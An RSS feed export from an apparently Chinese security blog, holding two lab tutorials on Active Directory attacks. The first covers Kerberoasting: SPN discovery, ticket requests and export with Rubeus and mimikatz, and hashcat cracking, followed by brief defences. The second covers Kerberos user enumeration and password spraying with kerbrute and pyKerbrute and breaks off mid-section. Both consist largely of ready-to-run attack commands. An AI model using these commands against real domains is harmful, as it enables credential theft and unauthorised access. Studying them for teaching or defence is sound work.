<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>云逸&#39;bolg • Posts by &#34;内网安全&#34; category</title>
        <link>http://gyzero.shop</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Tue, 12 Mar 2024 18:38:16 +0800</pubDate>
        <lastBuildDate>Tue, 12 Mar 2024 18:38:16 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2024/03/12/network-security/neiwang/Kerberoasting%E6%94%BB%E5%87%BB/Kerberoasting%E6%94%BB%E5%87%BB/</guid>
            <title>Kerberoasting攻击</title>
            <link>http://gyzero.shop/2024/03/12/network-security/neiwang/Kerberoasting%E6%94%BB%E5%87%BB/Kerberoasting%E6%94%BB%E5%87%BB/</link>
            <pubDate>Tue, 12 Mar 2024 18:38:16 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;spn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#spn&#34;&gt;#&lt;/a&gt; SPN&lt;/h3&gt;
&lt;p&gt;服务主体名称（Service Principal Name，简称 SPN）是服务实例的唯一标识符 Kerberos 身份验证使用 SPN 将服务实例与服务登录帐户相关联。这样，即使客户端没有帐户名称，客户端应用程序也能请求帐户的服务身份验证如果在计算机的整个目录林上安装多个服务实例，那么每个实例都必须有自己的 SPN&lt;/p&gt;
&lt;p&gt;就是服务实例注册到域控中的一个标识，域控用 SPN 来表示是那个服务，一个账户可以有多个 SPN 但是一个 SPN 只能有一个账户&lt;/p&gt;
&lt;p&gt;SPN 有两种，一是注册在 AD 上机器帐户 (Computers) 下，另一种注册在域用户帐户 (Users) 下。&lt;/p&gt;
&lt;p&gt;当一个服务的权限为 Local System 或 Network Service，则 SPN 注册在机器帐户 (Computers) 下。&lt;br&gt;
当一个服务的权限为一个域用户，则 SPN 注册在域用户帐户 (Users) 下。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;setspn -X 查询重复的SPN
setspn -Q */* 查看当前域内所有的SPN
setspn -T yunyi.io -Q */* 查看指定域内所有的SPN
setspn -D MSSQLvc/12server4.yunyi.io:1433 sqladmin 删除spn
setspn -A MSSQLvc/12server4.yunyi.io:1433 sqladmin 注册一个spn,在12server上为sqladmin用户注册SPN服务

MSSQLvc/12server4.yunyi.io:1433是你要注册的SPN 1433是服务端口，sqladmin是启动SQL Server实例服务的帐户的名称
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;kerberosast&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerberosast&#34;&gt;#&lt;/a&gt; Kerberosast&lt;/h3&gt;
&lt;p&gt;Kerberosast 攻击利用了 TGS_REP 阶段在这个阶段 TGS 返回的 ST 是由服务账户 hash 加密的，我们获取到 ST 后如果服务账号密码简单&lt;/p&gt;
&lt;p&gt;并且使用 RC4-HMAC_MD5 加密因为这个加密比较容易爆破，我们就可以对 ST 穷举获取到服务账号的明文密码&lt;/p&gt;
&lt;p&gt;利用的过程为：&lt;/p&gt;
&lt;p&gt;第一步找到 SPN 服务&lt;/p&gt;
&lt;p&gt;第二步请求指定 SPN 的 ST 票据&lt;/p&gt;
&lt;p&gt;第四步导出 ST&lt;/p&gt;
&lt;p&gt;第五步爆破&lt;/p&gt;
&lt;h3 id=&#34;发现spn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#发现spn&#34;&gt;#&lt;/a&gt; 发现 SPN&lt;/h3&gt;
&lt;h4 id=&#34;riskyspn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#riskyspn&#34;&gt;#&lt;/a&gt; RiskySPN&lt;/h4&gt;
&lt;p&gt;这款工具可以发现弱密码易受攻击的 SPN，自动去除 krbtgt 用户的 SPN 服务因为这个用户因为当前用户密码是随机的不固定的 128 位字符不可能爆破出来&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;\RiskySPNs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;psm1 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Find-PotentiallyCrackableAccounts&lt;/span&gt; 搜索脆弱Spn找到脆弱的帐户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Export-PotentiallyCrackableAccounts&lt;/span&gt; 产生全deatiled报告有关脆弱的帐户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314113846072.png&#34; alt=&#34;image-20240314113846072&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314113916993.png&#34; alt=&#34;image-20240314113916993&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;kerberoast-getuserspns&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerberoast-getuserspns&#34;&gt;#&lt;/a&gt; kerberoast-GetUserSPNs&lt;/h4&gt;
&lt;p&gt;kerberoast 工具集中的 GetUserSPNs.psl 和 GetUserSPNs.vbs 用于检测域中的 SPN&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;\GetUserSPNs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cscript &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;\GetUserSPNs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;vbs&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314113716199.png&#34; alt=&#34;image-20240314113716199&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314114032106.png&#34; alt=&#34;image-20240314114032106&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;powerview&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#powerview&#34;&gt;#&lt;/a&gt; PowerView&lt;/h4&gt;
&lt;p&gt;PowerSpolit 中的 PowerView.psl 脚本&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;\PowerView&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Get-NetUser&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;SPN&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314114307071.png&#34; alt=&#34;image-20240314114307071&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;请求spn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#请求spn&#34;&gt;#&lt;/a&gt; 请求 SPN&lt;/h3&gt;
&lt;p&gt;查询过滤完就该去请求有价值的 SPN 了&lt;/p&gt;
&lt;h4 id=&#34;rubeus请求spn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rubeus请求spn&#34;&gt;#&lt;/a&gt; Rubeus 请求 spn&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;Rubeus.exe kerberoast请求注册域用户下所有SPN
Rubeus.exe kerberoast /format:john /outfile:hash.txt 请求后输出成hash
Rubeus.exe kerberoast /spn:MSSQLSvc/12servser4.yunyi.io:1433 /format:john /outfile:hash2.txt 请求指定的spn并输出
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314120835012.png&#34; alt=&#34;image-20240314120835012&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314120745170.png&#34; alt=&#34;image-20240314120745170&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314121407174.png&#34; alt=&#34;image-20240314121407174&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;mimikatz请求票据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mimikatz请求票据&#34;&gt;#&lt;/a&gt; mimikatz 请求票据&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;kerberos::ask /target:MSSQLSvc/12servser4.yunyi.io:1433&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314121800096.png&#34; alt=&#34;image-20240314121800096&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;powershell-命令请求&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#powershell-命令请求&#34;&gt;#&lt;/a&gt; PowerShell 命令请求&lt;/h4&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Add-Type&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;AssemblyName System&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;IdentityModel 请求服务票据&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;klist列出服务票据&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314122815556.png&#34; alt=&#34;image-20240314122815556&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;导出票据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#导出票据&#34;&gt;#&lt;/a&gt; 导出票据&lt;/h3&gt;
&lt;h4 id=&#34;mimikatz导出&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mimikatz导出&#34;&gt;#&lt;/a&gt; mimikatz 导出&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314124524750.png&#34; alt=&#34;image-20240314124524750&#34;&gt;&lt;/p&gt;
&lt;p&gt;Rubeus 导出&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Rubeus.exe kerberoast /format:john /outfile:hash.txt 请求后输出成has&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314125002731.png&#34; alt=&#34;image-20240314125002731&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;破解票据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#破解票据&#34;&gt;#&lt;/a&gt; 破解票据&lt;/h3&gt;
&lt;h4 id=&#34;hashcat破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hashcat破解&#34;&gt;#&lt;/a&gt; hashcat 破解&lt;/h4&gt;
&lt;p&gt;将刚才 Rubeus 导出的 hash 拿到本地进行离线爆破&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hashcat -m 13100 hash.txt pass.txt --force&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hashcat hash.txt --show&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314130022282.png&#34; alt=&#34;image-20240314130022282&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;tgscrack&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tgscrack&#34;&gt;#&lt;/a&gt; tgscrack&lt;/h4&gt;
&lt;p&gt;先用 extractServiceTicketParts.py 脚本对 mimikatz 导出来的票据进行转换&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python2 extractServiceTicketParts.py MSSQLSvc\~12servser4.yunyi.io\~1433-YUNYI.IO.kirbi &amp;gt; hash2.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314131328670.png&#34; alt=&#34;image-20240314131328670&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着用 tgscrack.go 破解&lt;/p&gt;
&lt;p&gt;&lt;code&gt;go run tgscrack.go -hashfile hash2.txt -wordlist pass.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314131029438.png&#34; alt=&#34;image-20240314131029438&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;kerberoastpy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerberoastpy&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2tlcmJlcm9hc3QucHk=&#34;&gt;kerberoast.py&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;kerberoast 工具集里的脚本&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://github.com/nidem/kerberoast/blob/master/kerberoast.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python2 kerberoast.py pass.txt MSSQLSvc\~12servser4.yunyi.io\~1433-YUNYI.IO.kirbi&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;kerberosast防御&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerberosast防御&#34;&gt;#&lt;/a&gt; Kerberosast 防御&lt;/h3&gt;
&lt;p&gt;设置高强度密码定期修改密码&lt;/p&gt;
&lt;p&gt;尽可能不要使用 RC4_HMAC 加密使用更安全的 AES256_HMAC 加密&lt;/p&gt;
&lt;p&gt;给服务账号的权限尽量不要太高&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2024/03/09/network-security/neiwang/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</guid>
            <title>域用户枚举密码喷洒</title>
            <link>http://gyzero.shop/2024/03/09/network-security/neiwang/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</link>
            <pubDate>Sat, 09 Mar 2024 15:47:33 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;什么是密码喷洒&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;密码喷洒&lt;/strong&gt;（&lt;strong&gt;密码喷洒攻击&lt;/strong&gt;）是指攻击者使用常见密码试图访问一个域上的多个帐户。攻击者可以使用常见弱密码列表（例如 “123456” 或 “password1”）在一次攻击中访问多个帐户，在我们获得一个域用户的密码时可以用这一个密码去尝试登陆其他账户&lt;/p&gt;
&lt;p&gt;其实就是内网信息收集后，用同一个密码去爆破不同的用户名，去碰撞。&lt;/p&gt;
&lt;h3 id=&#34;用户枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户枚举&#34;&gt;#&lt;/a&gt; 用户枚举&lt;/h3&gt;
&lt;p&gt;做密码喷洒肯定是要先确定有哪些账号我们可以利用 Kerberos 错误代码进行判断&lt;/p&gt;
&lt;p&gt;抓取认证阶段的数据包分析&lt;/p&gt;
&lt;p&gt;图中 &lt;code&gt;cname&lt;/code&gt;  为认证用户名&lt;/p&gt;
&lt;p&gt;在 AS-REQ 数据包中三种状态的错误代码分别为：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-undefined&#34;&gt;KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证(启用)
KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销(禁用)
KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到用户存在的为 KDC_ERR_PREAUTH_REQUIRED&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310175010290.png&#34; alt=&#34;image-20240310175010290&#34;&gt;&lt;/p&gt;
&lt;p&gt;用户不存在的为 KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310180102228.png&#34; alt=&#34;image-20240310180102228&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;kerbrute工具枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerbrute工具枚举&#34;&gt;#&lt;/a&gt; kerbrute 工具枚举&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;kerbrute_windows_amd64.exe userenum &lt;span class=&#34;token parameter variable&#34;&gt;--dc&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.10.137 &lt;span class=&#34;token parameter variable&#34;&gt;-d&lt;/span&gt; yunyi.io user.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;userenum 用户枚举模式&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;dc&lt;/span&gt; 域控ip&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d 域名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user.txt 指定的字典&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310174119799.png&#34; alt=&#34;image-20240310174119799&#34;&gt;&lt;/p&gt;
&lt;p&gt;可看到图中有 test,yunyi,yunyi1,test1,test12 用户在真实环境中可以搜集各种当前环境的信息创建一个字典成功率更高&lt;/p&gt;
&lt;h4 id=&#34;msf模块枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf模块枚举&#34;&gt;#&lt;/a&gt; msf 模块枚举&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use auxiliary/gather/kerberos_enumusers&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; domain yunyi.io 域名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; rhosts &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.10.137 域控ip&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; user_file hc/user.txt 设置枚举用户字典&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310204600469.png&#34; alt=&#34;image-20240310204600469&#34;&gt;&lt;/p&gt;
&lt;p&gt;枚举出五个用户&lt;/p&gt;
&lt;h4 id=&#34;pykerbrute枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pykerbrute枚举&#34;&gt;#&lt;/a&gt; pyKerbrute 枚举&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;EnumADUser.py &amp;lt;域控制地址&amp;gt; &amp;lt;域名称&amp;gt; &amp;lt;文件&amp;gt; &amp;lt;模式&amp;gt;
python2 EnumADUser.py 10.10.10.137 yunyi.io user.txt tcp
python2 EnumADUser.py 10.10.10.137 yunyi.io user.txt udp模式也可以
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310233742455.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;密码喷洒&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#密码喷洒&#34;&gt;#&lt;/a&gt; 密码喷洒&lt;/h3&gt;
&lt;p&gt;枚举出了用户就该尝试登陆了，针对一个用户用不同密码爆破因为管理员可能会设置锁定，为了防止账号被锁可以用单个密码去登陆多个账户&lt;/p&gt;
&lt;h4 id=&#34;kerbrute&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerbrute&#34;&gt;#&lt;/a&gt; kerbrute&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;kerbrute_windows_amd64.exe passwordspray --dc 10.10.10.137 -d yunyi.io user.txt 123456
kerbrute_windows_amd64.exe passwordspray --dc 10.10.10.137 -d yunyi.io user.txt YUNyi123
--dc 域控IP
-d 域名
passwordspray 密码喷洒模式
12346 YUNyi123密码
user.txt 存在的域用户名
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310205801736.png&#34; alt=&#34;image-20240310205801736&#34;&gt;&lt;/p&gt;
&lt;p&gt;可见枚举出 test yunyi1 账号的密码为 123456&lt;/p&gt;
&lt;p&gt;test yunyi test1 为 YUNyi123&lt;/p&gt;
&lt;p&gt;有时管理员也可能会设置为不锁定账户这时也可以进行单个账户爆破密码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;kerbrute_windows_amd64.exe bruteuser --dc 10.10.10.137 -d yunyi.io pass.txt test&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;pass.txt 为密码字典 账号 test&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310210616793.png&#34; alt=&#34;image-20240310210616793&#34;&gt;&lt;/p&gt;
&lt;p&gt;抓包分析&lt;/p&gt;
&lt;p&gt;第一张图 test12ASREQ 包&lt;/p&gt;
&lt;p&gt;第二张 test12ASREP 包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310211333982.png&#34; alt=&#34;image-20240310211333982&#34;&gt;&lt;/p&gt;
&lt;p&gt;账号存在密码正确返回&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310211419532.png&#34; alt=&#34;image-20240310211419532&#34;&gt;&lt;/p&gt;
&lt;p&gt;错误的返回包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310212005332.png&#34; alt=&#34;image-20240310212005332&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;pykerbrute&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pykerbrute&#34;&gt;#&lt;/a&gt; pyKerbrute&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;https://github.com/3gstudent/pyKerbrute&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;ADPwdSpray.py &amp;lt;域控制地址&amp;gt; &amp;lt;域名称&amp;gt; &amp;lt;文件&amp;gt; &amp;lt;密码类型&amp;gt; &amp;lt;数据&amp;gt; &amp;lt;模式&amp;gt;
python2 ADPwdSpray.py 10.10.10.137 yunyi.io user.txt clearpassword YUNyi123 tcp
python2 ADPwdSpray.py 10.10.10.137 yunyi.io user.txt clearpassword 123456 tcp
python2 ADPwdSpray.py 10.10.10.137 yunyi.io user.txt ntlmhash 161cff084477fe596a5db81874498a24 tcp hash也是可以的
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310232927815.png&#34; alt=&#34;image-20240310232927815&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;domainpasswordspraypsl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#domainpasswordspraypsl&#34;&gt;#&lt;/a&gt; DomainPasswordSpray…psl&lt;/h4&gt;
